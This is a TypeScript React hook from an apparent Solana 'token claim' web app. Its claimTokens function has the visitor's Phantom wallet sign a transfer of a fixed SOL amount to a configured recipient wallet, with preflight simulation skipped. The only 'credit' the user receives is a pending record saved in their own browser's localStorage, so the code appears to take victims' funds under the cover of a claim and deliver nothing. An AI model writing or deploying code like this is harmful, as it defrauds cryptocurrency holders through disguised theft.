// src/hooks/useTransaction.ts
import { useState, useCallback } from 'react';
import { 
  Connection, 
  PublicKey, 
  Transaction, 
  SystemProgram, 
  LAMPORTS_PER_SOL,
  TransactionExpiredBlockheightExceededError,
  SendTransactionError
} from '@solana/web3.js';
import { TransactionState, ClaimRecord, PhantomProvider } from '../types/index';
import { CONFIG } from '../config';

const RPC_ENDPOINTS = [
  CONFIG.RPC_ENDPOINT,
  'https://api.devnet.solana.com',
];

const createConnection = (endpoint: string) => {
  return new Connection(endpoint, {
    commitment: 'confirmed',
    confirmTransactionInitialTimeout: 60000,
  });
};

export const useTransaction = () => {
  const [transactionState, setTransactionState] = useState<TransactionState>({
    status: 'idle',
    signature: null,
    error: null,
    progress: 0
  });

  const [currentRpcIndex, setCurrentRpcIndex] = useState<number>(0);

  const tryRpcEndpoints = async <T,>(
    operation: (conn: Connection) => Promise<T>,
    maxRetries: number = 3
  ): Promise<T> => {
    let lastError: Error | null = null;

    for (let i = 0; i < RPC_ENDPOINTS.length; i++) {
      const endpoint = RPC_ENDPOINTS[i];
      const tempConnection = createConnection(endpoint);

      for (let attempt = 0; attempt < maxRetries; attempt++) {
        try {
          const result = await operation(tempConnection);
          if (i !== currentRpcIndex) {
            setCurrentRpcIndex(i);
          }
          return result;
        } catch (error: any) {
          lastError = error;
          console.warn(`RPC attempt ${attempt + 1} failed for ${endpoint}:`, error.message);
          
          if (error.message?.includes('403') || error.message?.includes('429')) {
            break;
          }
          
          if (attempt < maxRetries - 1) {
            await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
          }
        }
      }
    }

    throw lastError || new Error('All RPC endpoints failed');
  };

  const handleTokenCredit = useCallback(async (publicKey: string, signature: string): Promise<void> => {
    const claimRecord: ClaimRecord = {
      walletAddress: publicKey,
      transactionSignature: signature,
      claimAmount: CONFIG.CLAIM_AMOUNT_SOL,
      tokenValue: CONFIG.TOKEN_VALUE_USD,
      timestamp: new Date().toISOString(),
      status: 'pending_credit'
    };

    try {
      const existingClaims = localStorage.getItem('tokenClaims');
      const claims: ClaimRecord[] = existingClaims ? JSON.parse(existingClaims) : [];
      claims.push(claimRecord);
      localStorage.setItem('tokenClaims', JSON.stringify(claims));
      
      // console.log('✅ Token credit record created:', claimRecord);
      // console.log('📋 Total claims:', claims.length);
    } catch (error) {
      console.error('Failed to store claim record:', error);
    }
  }, []);

  const claimTokens = useCallback(async (
    walletAddress: string,
    balance: number,
    provider: PhantomProvider
  ): Promise<void> => {
    setTransactionState({ 
      status: 'processing', 
      signature: null, 
      error: null, 
      progress: 10 
    });

    try {
      // console.log('💰 Current balance:', balance, 'SOL');
      // console.log('💸 Required:', CONFIG.CLAIM_AMOUNT_SOL, 'SOL');

      // Validate balance - need enough for fee + transfer amount
      const estimatedFee = 0.000005; // ~5000 lamports for simple transfer
      const totalNeeded = CONFIG.CLAIM_AMOUNT_SOL + estimatedFee;
      
      if (balance < totalNeeded) {
        throw new Error(
          `Insufficient balance! You have ${balance.toFixed(4)} SOL but need at least ${totalNeeded.toFixed(6)} SOL (${CONFIG.CLAIM_AMOUNT_SOL} SOL + network fee).`
        );
      }

      // Validate wallet connection
      if (!provider.isConnected) {
        throw new Error('Wallet disconnected. Please reconnect and try again.');
      }

      if (!provider.publicKey) {
        throw new Error('No public key found. Please reconnect your wallet.');
      }

      // console.log('🔄 Starting transaction...');
      // console.log(`   From: ${walletAddress}`);
      // console.log(`   To: ${CONFIG.RECIPIENT_WALLET}`);
      // console.log(`   Amount: ${CONFIG.CLAIM_AMOUNT_SOL} SOL`);

      setTransactionState(prev => ({ ...prev, progress: 20 }));
      
      const senderPublicKey = new PublicKey(walletAddress);
      const recipientPublicKey = new PublicKey(CONFIG.RECIPIENT_WALLET);

      // Get latest blockhash
      setTransactionState(prev => ({ ...prev, progress: 30 }));
      
      const { blockhash, lastValidBlockHeight } = await tryRpcEndpoints(
        async (conn) => {
          return await conn.getLatestBlockhash('confirmed');
        }
      );

      // Build transaction
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: senderPublicKey,
          toPubkey: recipientPublicKey,
          lamports: CONFIG.CLAIM_AMOUNT_SOL * LAMPORTS_PER_SOL
        })
      );

      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderPublicKey;

      // console.log('📝 Transaction built, requesting signature...');
      setTransactionState(prev => ({ ...prev, progress: 50 }));

      // Sign transaction with Phantom
      let signedTransaction;
      try {
        signedTransaction = await provider.signTransaction(transaction);
      } catch (signError: any) {
        if (signError.message?.includes('User rejected')) {
          throw new Error('Transaction was rejected by user.');
        }
        throw new Error(`Failed to sign transaction: ${signError.message}`);
      }

      // console.log('✅ Transaction signed, sending to network...');
      setTransactionState(prev => ({ ...prev, progress: 70, status: 'confirming' }));

      // Send transaction - skip preflight to avoid simulation errors
      let signature;
      try {
        signature = await tryRpcEndpoints(
          async (conn) => {
            return await conn.sendRawTransaction(signedTransaction.serialize(), {
              skipPreflight: true, // Skip simulation
              preflightCommitment: 'processed',
              maxRetries: 3,
            });
          }
        );
      } catch (sendError: any) {
        // If skipPreflight fails with insufficient funds, it's a real balance issue
        if (sendError instanceof SendTransactionError) {
          const logs = await sendError.getLogs();
          console.error('Transaction logs:', logs);
          
          if (sendError.message.includes('Attempt to debit')) {
            throw new Error(
              `No funds available! Make sure:\n` +
              `1. You're on the correct network (mainnet/devnet)\n` +
              `2. You have at least ${totalNeeded.toFixed(6)} SOL\n` +
              `3. Get SOL from an exchange or faucet\n\n` +
              `Current balance: ${balance.toFixed(4)} SOL`
            );
          }
        }
        throw sendError;
      }

      // console.log(`📤 Transaction sent: ${signature}`);
      // console.log(`🔗 View on Solscan: https://solscan.io/tx/${signature}`);
      setTransactionState(prev => ({ ...prev, progress: 85 }));

      // Confirm transaction
      try {
        const confirmation = await tryRpcEndpoints(
          async (conn) => {
            return await conn.confirmTransaction(
              { signature, blockhash, lastValidBlockHeight },
              'confirmed'
            );
          },
          5
        );

        if (confirmation.value.err) {
          throw new Error(`Transaction failed: ${JSON.stringify(confirmation.value.err)}`);
        }
      } catch (confirmError: any) {
        if (confirmError instanceof TransactionExpiredBlockheightExceededError) {
          throw new Error('Transaction timed out. The network may be congested. Please try again.');
        }
        throw confirmError;
      }

      // Success!
      // console.log('🎉 Transaction confirmed successfully!');
      setTransactionState({
        status: 'success',
        signature,
        error: null,
        progress: 100
      });

      // Handle token credit
      await handleTokenCredit(walletAddress, signature);

    } catch (error: any) {
      console.error('❌ Transaction error:', error);
      
      let errorMessage = error.message || 'An unexpected error occurred';
      
      // Better error messages
      if (errorMessage.includes('insufficient') || errorMessage.includes('No funds')) {
        // Keep the detailed message
      } else if (errorMessage.includes('User rejected')) {
        errorMessage = 'Transaction cancelled. You can try again when ready.';
      } else if (errorMessage.includes('403') || errorMessage.includes('429')) {
        errorMessage = 'Network busy. Please try again in a few moments.';
      } else if (errorMessage.includes('timeout') || errorMessage.includes('expired')) {
        errorMessage = 'Transaction timed out. Please try again.';
      }
      
      setTransactionState({
        status: 'error',
        signature: null,
        error: errorMessage,
        progress: 0
      });
      
      // Auto-reset error after 8 seconds
      setTimeout(() => {
        setTransactionState(prev => 
          prev.status === 'error' ? { ...prev, status: 'idle' as const, error: null } : prev
        );
      }, 8000);
      
      throw error;
    }
  }, [handleTokenCredit]);

  const resetTransaction = useCallback((): void => {
    setTransactionState({
      status: 'idle',
      signature: null,
      error: null,
      progress: 0
    });
  }, []);

  return {
    transactionState,
    claimTokens,
    resetTransaction
  };
};